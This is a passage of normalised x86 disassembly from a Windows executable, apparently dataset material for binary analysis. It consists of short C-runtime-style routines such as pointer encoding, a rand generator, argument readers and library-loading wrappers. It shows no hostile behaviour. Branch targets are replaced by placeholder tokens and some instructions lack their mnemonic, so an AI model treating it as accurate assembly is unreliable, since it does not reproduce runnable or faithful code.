mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x8
pop ebp
jmp sub_414f33
sub_41504c
push ebp
mov ebp esp
push [ ecx + 0x8 ]
push [ ecx + 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41510a
add esp 0x10
pop ebp
retn 0x8
sub_415ecf
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_415f3a
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_4162df
mov eax [ rw-data ]
and eax 0x4000
retn
sub_4162ea
mov eax [ ecx + 0x4 ]
shr eax 0xb
and eax 0x1
retn
sub_4162f4
mov eax [ ecx + 0x4 ]
shr eax 0xe
and eax 0x1
retn
sub_4162fe
xor eax eax
cmp [ ecx ] eax
sete al
retn
sub_416306
xor eax eax
cmp [ ecx ] 0x9
sete al
retn
sub_41630f
mov eax [ ecx + 0x4 ]
shr eax 0xc
and eax 0x1
retn
sub_416319
mov eax [ ecx + 0x4 ]
shr eax 0xd
and eax 0x1
retn
sub_416323
mov eax [ ecx + 0x4 ]
shr eax 0x8
and eax 0x1
retn
sub_41632d
xor eax eax
cmp [ ecx ] eax
je r-xdata
retn
test [ ecx + 0x4 ] 0x200
je r-xdata
inc eax
sub_41633e
xor eax eax
cmp [ ecx ] eax
je r-xdata
retn
test [ ecx + 0x4 ] 0x400
je r-xdata
inc eax
sub_41634f
mov eax [ ecx + 0x4 ]
shr eax 0xf
and eax 0x1
retn
sub_416359
xor eax eax
cmp [ ecx + 0x4 ] 0x1
setle al
retn
sub_416381
mov eax [ ecx + 0x8 ]
retn
sub_416385
xor eax eax
inc eax
retn
sub_416389
mov ecx [ ecx + 0x4 ]
test ecx ecx
jne sub_416363
xor eax eax
retn
sub_4163e1
mov eax [ ecx + 0x8 ]
retn
sub_41646b
or [ ecx + 0x4 ] 0x800
retn
sub_416473
or [ ecx + 0x4 ] 0x4000
retn
sub_41647b
or [ ecx + 0x4 ] 0x1000
retn
sub_416483
or [ ecx + 0x4 ] 0x2000
retn
sub_41648b
cmp [ ecx ] 0x0
je r-xdata
retn
or [ ecx + 0x4 ] 0x200
sub_416498
or [ ecx + 0x4 ] 0x8000
retn
sub_4164a0
or [ ecx + 0x4 ] 0x100
mov eax ecx
retn
sub_4164aa
movsx eax [ ecx + 0x4 ]
retn
sub_4164d0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
cmp [ ecx ] al
je r-xdata
pop ebp
retn
inc eax
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
sub_4165a3
push esi
call sub_41066e
pop ecx
retn
sub_416638
push esi
call sub_41066e
pop ecx
retn
sub_416759
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_416690
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_4167a4
call eax
retn
sub_4167a7
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
pop ebp
retn
mov eax sub_42cf31
sub_4167bb
call sub_40eb1b
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax sub_42cf31
sub_4167cd
push ebp
mov ebp esp
call sub_40eb1b
mov edx eax
mov eax [ edx + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ edx + 0x4 ] ecx
pop ebp
retn
mov eax sub_42cf31
sub_4167eb
push esi
call sub_40eb1b
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
call sub_42cf31
mov ecx esi
call j_sub_40d468
call esi
sub_416d84
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx eax
xor eax [ ebp + 0x8 ]
and ecx 0x1f
ror eax cl
pop ebp
retn
sub_416d98
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
[ ecx ] edx
pop ebp
retn
sub_416daa
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
xchg [ ecx ] eax
pop ebp
retn
sub_416db7
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor edx edx
xor eax eax
[ ecx ] edx
pop ebp
retn
sub_416dc7
xor ecx ecx
mov edx rw-data
xor eax eax
[ edx ] ecx
mov ecx [ rw-data ]
xor eax [ rw-data ]
and ecx 0x1f
ror eax cl
retn
sub_416de6
push esi
call sub_416dc7
mov esi eax
test esi esi
je r-xdata
call sub_42d153
mov ecx esi
call j_sub_40d468
call esi
sub_416e26
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
retn
sub_416e3e
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx eax
xor eax [ ebp + 0x8 ]
and ecx 0x1f
ror eax cl
pop ebp
retn
sub_416e73
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetProcAddress@IAT ]
pop ebp
retn
sub_416e86
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
pop ebp
retn
sub_416e92
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_416ea2
mov edi edi
push esi
mov esi ecx
cmp [ esi ] 0x0
je r-xdata
pop esi
retn
push [ esi ]
call [ FreeLibrary@IAT ]
and [ esi ] 0x0
sub_416eb9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
pop ebp
retn
sub_416ec5
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0xe06d7363
sete al
pop ebp
retn
sub_416ed8
mov edi edi
push esi
mov esi ecx
cmp [ esi ] 0x0
je r-xdata
pop esi
retn
push [ esi ]
call [ FreeLibrary@IAT ]
and [ esi ] 0x0
sub_416eef
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ FreeLibrary@IAT ]
neg eax
sbb eax eax
neg eax
pop ebp
retn
sub_417004
mov esp [ ebp - 0x18 ]
call sub_42cf31
sub_41700f
push 0x2
call sub_42f374
pop ecx
retn
sub_41701e
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_417083
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_41703c
xor eax eax
retn
sub_4170ed
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x2
push [ ebp + 0x8 ]
call sub_416f05
add esp 0xc
pop ebp
retn
sub_417103
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_417112
push 0x1
push 0x2
push 0x0
call sub_416f05
add esp 0xc
retn
sub_417121
push 0x1
push 0x0
push 0x0
call sub_416f05
add esp 0xc
retn
sub_417130
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x2
push [ ebp + 0x8 ]
call sub_416f05
add esp 0xc
pop ebp
retn
sub_417146
mov eax [ rw-data ]
retn
sub_417184
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_416f05
add esp 0xc
pop ebp
retn
sub_41719a
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_416f05
add esp 0xc
pop ebp
retn
sub_4171b0
call sub_42fa1d
imul ecx [ eax + 0x18 ] 0x343fd
add ecx 0x269ec3
mov [ eax + 0x18 ] ecx
shr ecx 0x10
and ecx 0x7fff
mov eax ecx
retn
sub_4171d1
mov edi edi
push ebp
mov ebp esp
call sub_42fa1d
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x18 ] ecx
pop ebp
retn
sub_4171e3
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d0aa
pop ecx
pop ebp
retn 0x4
sub_4171f5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_417205
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_417215
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_417227
mov eax [ ecx ]
retn
sub_41722a
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_417230
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_4173c0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_41750c
test esi esi
jne r-xdata
push [ ebp - 0x1c ]
call sub_4173c0
pop ecx
retn
push [ ebp - 0x1c ]
call sub_431863
pop ecx
sub_4175cd
test esi esi
jne r-xdata
push [ ebp - 0x1c ]
call sub_4173c0
pop ecx
retn
push [ ebp - 0x1c ]
call sub_431863
pop ecx
sub_41762a
mov eax [ ecx ]
retn
sub_41762d
push [ ecx ]
call sub_4173c0
pop ecx
retn
sub_417636
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_41763e
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_417462
sub_417649
mov edi edi
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417523
add esp 0xc
pop ebp
retn
sub_4176a7
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_417523
sub_4176b2
mov edi edi
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417462
add esp 0xc
pop ebp
retn
sub_417710
mov eax [ ecx ]
mov eax [ eax + 0xc ]
retn
sub_417716
mov eax [ ecx ]
mov eax [ eax + 0xc ]
shr eax 0xd
and eax 0x1
retn
sub_417722
mov eax [ ecx ]
mov eax [ eax + 0xc ]
shr eax 0xc
and eax 0x1
retn
sub_41781a
push [ ebp - 0x20 ]
call sub_4173c0
pop ecx
retn
sub_417869
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_4173c0
pop ecx
retn
sub_41789d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_4178d1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_417901
push [ ecx ]
movzx eax [ ecx + 0x4 ]
push eax
call sub_433200
pop ecx
pop ecx
retn
sub_417910
push [ ecx ]
call sub_4173ac
pop ecx
retn
sub_41795f
push [ ecx ]
call sub_4173c0
pop ecx
retn
sub_417968
mov eax [ ecx ]
mov eax [ eax + 0xc ]
and eax 0x4c0
neg eax
sbb eax eax
neg eax
retn
sub_417979
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx ]
mov eax [ eax + 0xc ]
and eax [ ebp + 0x8 ]
neg eax
sbb eax eax
neg eax
pop ebp
retn 0x4
sub_417990
mov eax [ ecx ]
mov eax [ eax + 0xc ]
test al 0xc0
push 0x0
pop eax
setne al
retn
sub_417e5b
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_4173c0
pop ecx
retn
sub_417eac
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_4173c0
pop ecx
retn
sub_417efd
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_4173c0
pop ecx
retn
sub_417f4e
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_4173c0
pop ecx
retn
sub_417f9f
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_4173c0
pop ecx
retn
sub_417ff0
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_4173c0
pop ecx
retn
sub_418f9d
mov eax [ ecx + 0x404 ]
test eax eax
jne r-xdata
retn
mov eax ecx
sub_418faa
mov eax [ ecx + 0x404 ]
test eax eax
jne r-xdata
retn
mov eax ecx
sub_4198a1
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov cl [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] cl
mov al 0x1
pop ebp
retn 0x4
sub_4198bb
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov cl [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] cl
mov al 0x1
pop ebp
retn 0x4
sub_419fd1
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
mov al 0x1
pop ebp
retn 0x4
sub_419fef
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
mov al 0x1
pop ebp
retn 0x4
sub_41a00d
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
mov al 0x1
pop ebp
retn 0x4
sub_41a02b
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
mov al 0x1
pop ebp
retn 0x4
sub_41a241
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a25b
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a275
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a28f
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a2a9
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a341
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a35b
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a375
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a40d
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a427
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a441
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a4d9
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a4f3
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a50d
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a5a5
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a5bf
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a7d1
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a7eb
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a805
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a81f
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41b269
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov cx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] cx
mov al 0x1
pop ebp
retn 0x4
sub_41b285
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov cx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] cx
mov al 0x1
pop ebp
retn 0x4
sub_41b2a1
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov cx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] cx
mov al 0x1
pop ebp
retn 0x4
sub_41b2bd
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov cx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] cx
mov al 0x1
pop ebp
retn 0x4
sub_41b2d9
push 0x3
pop eax
retn
sub_41b2dd
push 0x3
pop eax
retn
sub_41b2e1
push 0x3
pop eax
retn
sub_41b2e5
push 0x3
pop eax
retn
sub_41b2e9
push 0x3
pop eax
retn
sub_41b2ed
push 0x3
pop eax
retn
sub_41b2f1
push 0x3
pop eax
retn
sub_41b2f5
push 0x3
pop eax
retn
sub_41b2f9
push 0x3
pop eax
retn
sub_41b2fd
push 0x3
pop eax
retn
sub_41b301
push 0x3
pop eax
retn
sub_41b305
push 0x3
pop eax
retn
sub_41b445
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x70
sete al
pop ebp
retn
sub_41b455
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x70
sete al
pop ebp
retn
sub_41b465
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x70
sete al
pop ebp
retn
sub_41b476
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x70
sete al
pop ebp
retn
sub_41b580
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov al [ eax ]
pop ebp
retn
sub_41b58c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov al [ eax ]
pop ebp
retn
sub_41b598
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ax [ eax ]
pop ebp
retn
sub_41b5a5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ax [ eax ]
pop ebp
retn
sub_41b5b2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
pop ebp
retn
sub_41b5be
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
pop ebp
retn
sub_41b5ca
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
pop ebp
retn
sub_41b5d6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
pop ebp
retn
sub_41b5e2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
pop ebp
retn
sub_41b5ee
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
pop ebp
retn
sub_41b5fa
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
pop ebp
retn
sub_41b606
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
pop ebp
retn
sub_41b612
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov edx [ edx + 0x4 ]
pop ebp
retn
sub_41b621
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov edx [ edx + 0x4 ]
pop ebp
retn
sub_41b630
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov edx [ edx + 0x4 ]
pop ebp
retn
sub_41b63f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ax [ eax ]
pop ebp
retn
sub_41b680
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov al [ eax - 0x4 ]
pop ebp
retn
sub_41b692
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov al [ eax - 0x4 ]
pop ebp
retn
sub_41b6a4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
pop ebp
retn
sub_41b6b7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
pop ebp
retn
sub_41b6ca
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b6dc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b6ee
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b700
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b712
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b724
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b736
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b748
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b75a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b76c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b77e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b790
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b7a2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b7b4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b7c6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b7d8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b7ea
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x8
mov edx [ eax ]
mov eax [ edx - 0x8 ]
mov edx [ edx - 0x4 ]
pop ebp
retn
sub_41b7ff
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x8
mov edx [ eax ]
mov eax [ edx - 0x8 ]
mov edx [ edx - 0x4 ]
pop ebp
retn
sub_41b814
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x8
mov edx [ eax ]
mov eax [ edx - 0x8 ]
mov edx [ edx - 0x4 ]
pop ebp
retn
sub_41b829
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
pop ebp
retn
j_sub_418f85
jmp sub_418f85
sub_41c56d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_41c5a7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_41c5e1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_41c61b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_41c62d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_41c667
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_41c6a1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_41c6b3
mov edi edi
push ebp
mov ebp esp
